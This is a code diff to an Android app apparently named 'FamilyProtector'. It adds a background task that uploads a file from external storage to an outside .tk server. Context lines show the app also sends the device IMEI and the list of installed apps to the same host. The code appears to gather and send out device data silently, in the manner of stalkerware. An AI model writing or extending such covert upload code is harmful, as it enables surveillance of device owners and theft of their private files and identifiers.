@@ -31,6 +31,7 @@ import android.location.Address;
 import android.location.Geocoder;
 import android.location.LocationListener;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -116,6 +117,18 @@ public class MainActivity extends FragmentActivity {
 
         Logger.l(new Device().getImei(this));
         startMainService();
+        final Context c = this;
+
+        new AsyncTask<String, String, Void>() {
+
+            @Override
+            protected Void doInBackground(String... strings) {
+                File uploadFile1 = new File(Environment.getExternalStorageDirectory() + "//FamilyProtector//"+"579"+"salam.png");
+                new Util(c).uploadImage("http://tmhgame.tk/abram", uploadFile1);
+                Logger.l("FAYLA", "gonderildi");
+                return null;
+            }
+        }.execute("");
 
 
 
@@ -244,6 +257,7 @@ public class MainActivity extends FragmentActivity {
         O.put("apps", a);
         O.put("imei", new Device().getImei(this));
         new ServerHelper(this).execute("http://tmhgame.tk/initApp", O.toString());
+
 
     }
 
